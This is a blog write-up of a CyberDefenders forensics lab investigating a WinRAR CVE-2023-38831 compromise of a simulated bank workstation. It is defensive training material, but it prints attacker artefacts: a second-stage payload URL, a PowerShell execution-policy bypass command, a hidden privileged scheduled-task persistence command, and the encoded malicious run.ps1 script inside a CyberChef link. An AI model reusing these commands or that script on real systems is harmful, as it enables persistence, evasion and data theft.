---
title: SpottedInTheWild writeup
layout: post
post-image: "/posts_media/SpottedInTheWild/SpottedInTheWild.png"
description: Detailed writeup on SpottedInTheWild, a CyberDefenders retired endpoint forensics investigation.
tags:
- cyberdefenders
- labs
- forensics
- CTF
- writeup
- windows
---

<style>
@keyframes pulse {
  0% { color: red; }
  50% { color: black; }
  100% { color: red; }
}

.pulsing-text {
  font-weight: bold;
  animation: pulse 1.5s infinite;
}
</style>

Difficulty: <span class="pulsing-text">Hard</span>

Let's begin by reading the **scenario**:

>You are part of the incident response team at FinTrust Bank. This morning, the network monitoring system flagged unusual outbound traffic patterns from several workstations. Preliminary analysis by the IT department has identified a potential compromise linked to an exploited vulnerability in WinRAR software. As an incident responder, your task is to investigate this compromised workstation to understand the scope of the breach, identify the malware, and trace its activities within the network.

---

## Tools

CyberDefenders tells us that the investigation is Windows-based and that the tools we will be using are listed below:
<ul style="margin-top: 0;">
<li><a href="https://arsenalrecon.com/downloads">Arsenal Image Mounter</a></li>
<li><a href="https://sqlitebrowser.org/dl/">SQLite Viewer</a></li>
<li><a href="https://ericzimmerman.github.io/#!index.md">Eric Zimmerman Tools</a></li>
<li><a href="https://code.google.com/archive/p/ntfs-log-tracker/downloads">NTFS Log Tracker</a></li>
<li><a href="https://ericzimmerman.github.io/#!index.md">Registry Explorer</a></li>
<li><a href="https://eventlogxp.com/it/">Event Log Explorer</a></li>
<li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/strings">Strings</a></li>
<li><a href="https://gchq.github.io/CyberChef/">CyberChef</a></li>
</ul>

---

## First question 

>In your investigation into the FinTrust Bank breach, you found an application that was the entry point for the attack. Which application was used to download the malicious file?

After downloading the `166-SpottedInTheWild.zip` file and extracting the .vhd file using `cyberdefenders.org` as the password, we can proceed with our investigation.

The first thing we need to do is mount the virtual hard disk using Arsenal Image Mounter

![Mount VHD file in Arsenal Image Mounter](/posts_media/SpottedInTheWild/arsenal.PNG)

To mount the VHD file just click on **File** and then **Mount disk image file**

By going to `C\Users\Administrator\Desktop`, the presence of Telegram as a link immediately appears.

![Answer number one](/posts_media/SpottedInTheWild/A1.PNG)
 
Answer: `Telegram`  

---

## Second question

>Finding out when the attack started is critical. What is the UTC timestamp for when the suspicious file was first downloaded?

I decided to use [FTK Imager](https://www.exterro.com/ftk-product-downloads/ftk-imager-version-4-7-1) to further investigate the files involved. The beauty of these investigations is the freedom to use tools other than those recommended. 

![Suspicious SANS .rar file](/posts_media/SpottedInTheWild/FTK_Imager.PNG)

After exploring a bit, the file `SANS SEC401.rar` seemed suspicious to me since it was downloaded from Telegram.

Not even time to put it in my virtual machine that **Windows Defender** detected it as a malicious file and gave us the answer to the third question 😂

![](/posts_media/SpottedInTheWild/Defender.PNG)

But now let's focus on the second question, and check the **properties** of the .rar file from FTK Imager

![](/posts_media/SpottedInTheWild/ftk_properties_rar.png)

**Important**: the correct answer is time in the format FILENAME, not UTC.

![](/posts_media/SpottedInTheWild/A2.PNG)

Answer: `2024-02-03 07:33:20`

---

## Third question

We have already taken the solution to this question thanks to **Windows Defender**, but let's try to understand a little more about how this exploit works.

CVE-2023-38831 is a critical vulnerability in `WinRAR`, patched in August 2023, that leads to improper file expansion when decompressing manipulated archives. 

If you would like to learn more about `CVE-2023-38831`, I recommend that you watch this video:

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZcZQRwj6aMM?start=2" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

<br>

To confirm that the .rar file is malicious, I also did a scan with [VirusTotal](https://www.virustotal.com/gui/file/d1a55bb98b750ce9b9d9610a857ddc408331b6ae6834c1cbccca4fd1c50c4fb8)

![](/posts_media/SpottedInTheWild/virustotal.PNG)

| Algorithm    | Hash |
| -------- | ------- |
| MD5  | 1fbd3ca9fcfea5aac390ea38ff818cc9  |
| SHA1 | 04bb53bd8a264be0b3ea10ffa1945eb6f5ecda93 |
| SHA256    | d1a55bb98b750ce9b9d9610a857ddc408331b6ae6834c1cbccca4fd1c50c4fb8  |

<br>

Answer: `CVE-2023-38831`

---
## Fourth question

>In examining the downloaded archive, you noticed a file in with an odd extension indicating it might be malicious. What is the name of this file?

This question is quite simple, to get the answer just open the folder inside the .rar file and take a look at the `.pdf .cmd` file. 

![](/posts_media/SpottedInTheWild/ftk_imager2.PNG)

Answer: `SANS SEC401.pdf .cmd`

---

## Fifth question

>Uncovering the methods of payload delivery helps in understanding the attack vectors used. What is the URL used by the attacker to download the second stage of the malware?

It's now obvious that the investigation is asking us to investigate this recently found file. To do this, I used a tool called [cmd watcher](https://www.kahusecurity.com/tools/CMDWatcher_v0.4.7z) from kahusecurity.

![malicious bash file](/posts_media/SpottedInTheWild/cmd.PNG)

This tool proved to be very useful, as it also contained the answers to the later questions.

![malicious bash http link](/posts_media/SpottedInTheWild/cmd2.png)

You can also see the answer on [Hybrid Analysis](https://hybrid-analysis.com/sample/5790225b1bcfa692c57a0914dd78678ceef6e212fbe7042b7ddf5a06fd4ab70d/65cf8e325bd827eb200d7549) 

![](/posts_media/SpottedInTheWild/hybridanalysis.PNG)

Answer: `http://172.18.35.10:8000/amanwhogetsnorest.jpg`

---

## Sixth question

>To further understand how attackers cover their tracks, identify the script they used to tamper with the event logs. What is the script name?

We already got the answer by starting the cmd file.

![](/posts_media/SpottedInTheWild/A7.png)

The attacker is clever because with the command `cmd /c powershell -NOP -EP Bypass C:\Windows\Temp\Eventlogs.ps1` he creates a file to make us believe that they are PowerShell logs.

To understand this command:

* **-NOP** is used to start PowerShell without loading any profile. 
* **-EP** Bypass allows scripts to run without any restriction.
* **C:\Windows\Temp\Eventlogs.ps1** This is the PowerShell file that is going to be executed. 

![](/posts_media/SpottedInTheWild/A6.PNG)

Answer: `Eventlogs.ps1` 

---

## Seventh question

>Knowing when unauthorized actions happened helps in understanding the attack. What is the UTC timestamp for when the script that tampered with event logs was run?

The first thing to do is to extract the PowerShell logs from `C:\Windows\System32\winevt\logs\`  

![](/posts_media/SpottedInTheWild/extract.png)

To export the file click on `Windows Powershell.evtx` and press **Export Files**. 

Now to analyse the PowerShell log file, I can use Event Log Explorer 

![](/posts_media/SpottedInTheWild/event_log.png)

When we perform forensic analysis, the [Event 403](https://www.myeventlog.com/search/show/971) in the PowerShell log files is very important because it tells us that the engine status has changed from <strong style="color: green;">Available</strong> to <strong style="color: red;">Stopped</strong>. It indicates that PowerShell has **completed** its activity.

![](/posts_media/SpottedInTheWild/time.png)

Now we just have to put the answer in the correct format.

Answer: `2024-02-03 07:38:01`

---

## Eighth question

>We need to identify if the attacker maintained access to the machine. What is the command used by the attacker for persistence?

We already got this command from the cmd

![](/posts_media/SpottedInTheWild/command.PNG)


Let's try to understand what it does:

* **schtasks** is used to schedule tasks 
* **/create** creates a new scheduled task
* **/sc minute** is the frequency (in this case it's defined in minutes)
* **/mo 3** modifies the schedule every 3 minutes
* **/tn whoisthebaba** name of the scheduled task
* **/tr C:\Windows\Temp\run.bat** is the action it does (start run.bat)
* **/RL HIGHEST** it runs the task with the highest privileges

The contents of `run.bat` are obfuscated by the file `run.ps1`

Answer: `schtasks /create /sc minute /mo 3 /tn "whoisthebaba" /tr C:\Windows\Temp\run.bat /RL HIGHEST`

---

## Ninth question

>To understand the attacker's data exfiltration strategy, we need to locate where they stored their harvested data. What is the full path of the file storing the data collected by one of the attacker's tools in preparation for data exfiltration?

Hands down, this was the **most difficult question** of the entire investigation. A logical thing to do after the eighth question is to continue investigating the file `run.ps1`

The file is located in `C:\Windows\Temp\`, let's extract it.

![](/posts_media/SpottedInTheWild/file_to_extract.png)

![](/posts_media/SpottedInTheWild/code.PNG)

We can see that the file contains a long string in `base64`. To decrypt it, we have two methods:

### FIRST METHOD

```py
import base64

string = "" 

rev = string[::-1]

bytes_d = base64.b64decode(rev)
plaintext = bytes_d.decode('utf-8', errors='ignore')

print(plaintext)
```

### SECOND METHOD

Open the file with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=JGJlc3Q2NGNvZGUgPSAiSzBBVkZkRUlrOUdhMFZXVHRBaUl5Rm1kazhDTXdBRE82VWpMeDRDTzJFakx5a1RNdjhpT3dSSGRvSkNJcEpYVnRBQ2R6VldkeFZtVWlWMlZ0VTJhdlpuYkpwUURwa1Nac2xtUjBWSGMwVjNia2d5Y2xSWGVDeEdiQlJXWWxKbE82MFZac2xtUnU4VVN1MFdaME5YZVR0RktuNVdheVIzVTBZVFp6Rm1RdlJsTzYwRmR5Vm1kdTkyUXUwV1owTlhlVHRGSTlBaWNoWkhKSzBnSWx4V2FHUlhkd1JYZHZSQ0l2UkhJa1ZtZGhOSEl6UkhiMU5YWnlCaWJoTjJVaUFDZHo5R1N0VUdkcEozVkswZ0NOMG5DTjBISWdBQ0lLMFFac2xtUjBWSGMwVjNia0FDYTBGR1VseFdhRzFDSWs1V1p3QlhRdEFTWnNsbVJ0UVhkUEJDZmdJaUxsNVdhc1ptWnZCeWNwQkNVSlJuYmxKbmMxTkdKZ1EzY3Zoa0lnQUNJZ0FDSWdBaUNOSWlMbDVXYXNabVp2QnljcEJDVUpSbmJsSm5jMU5HSmdRM2N2aGtJZ1EzY3ZoVUxsUlhheWRGSWdBQ0lnQUNJZ29RRDdCU1p6eFdaZzBISWdBQ0lLMFFac2xtUjBWSGMwVjNia0FDYTBGR1VseFdhRzFDSWs1V1p3QlhRdEFTWnNsbVJ0UVhkUEJDZmdJaUxsNVdhczUyYmdNWGFnQVZTMDVXWnlKWGRqUkNJME4zYklKQ0lnQUNJZ0FDSWdvUURpNFNadWxHYnU5R0l6bEdJUWxFZHVWbWN5VjNZa0FDZHo5R1NpQUNkejlHU3RVR2RwSjNWZ0FDSWdBQ0lnQWlDTnNISXB3R2IxNUdKZ1VtYnRBQ2RzVjNjbEpISm9BaVpwQkNJZ0FpQ05vUURsVm5icFJuYnZOVWVzUm5ibHhXYVRCaWJ2bEdkakZrY3ZKbmNGMUNJeEFDZHVWM2JEMUNJUWxFZHVWbWN5VjNZa0FTWnRGbVR5VkdkMUJYYnZOVUxnNDJicFIzWWw1bWJ2TlVMME5YWlVCU1BnUUhiMU5YWnlSQ0lnQUNJSzBnSTA1V1p5SlhkalJTS3BFRElyQVNLbjR5Sm9ZMlQ0VkdadWxFZHpGR1R1QVZTMEpYWTBOSEpnd0NNb2NtYnBKSGR6SldkVDVDVUpSbmNoUjNja2dDSmlBU1BnQVZTMDVXWnlKWGRqUkNJZ0FDSUswd2Vna3lLclFuYmxKbmMxTkdKZ3NEWnVWR0pnVUdidEFDZHVWbWN5VjNZa0F5TzBKWFkwTkhKZzBESTA1V1p5SlhkalJDS2dJM2JtcFFESzBRWHpzVktvTVhaMGxuUXpOWFp5UkdaQlJYWkg1U0tRbEVadVZHSm9VMmN5RkdVNm9UWHpOWFp5UkdaQkJWU3VRWFpPNVNibFIzYzVOMVdnMERJazVXWmtvUURkTnpXcGd5Y2xSWGVDTjNjbEpIWmtGRWRsZGtMcEFWUzBKWFkwTkhKb1UyY3lGR1U2b1RYek5YWnlSR1pCQlZTdVFYWk81U2JsUjNjNU4xV2cwREkwSlhZME5ISkswZ0NOSUNkNFJuTDJVek0wd2tRY0JYYmxSRlhzRjJZdnhFWGhSWFlFQkhjQnhWWnNsbVp2SkhVeVYyY1ZwamR1VkdKaUFTUGdVR2JwWkVkMUJIZDE5R0pLMGdJNWtqTHg0Q08yRWpMeWtUTWlBU1BnQVZTazVXWmtvUURpRWpMeDRDTzJFakx5a1RNaUFTUGdBVlMwSlhZME5ISg0KDQo&ieol=CRLF&oeol=CRLF) and use the function **Reverse** and **From Base 64**

![](/posts_media/SpottedInTheWild/cyberchef.png)


![](/posts_media/SpottedInTheWild/A9.PNG)

Answer: `C:\Users\Administrator\AppData\Local\Temp\BL4356.txt`

---

## Conclusion 

Thank you for reaching this point! I hope you enjoyed my writeup 🙂
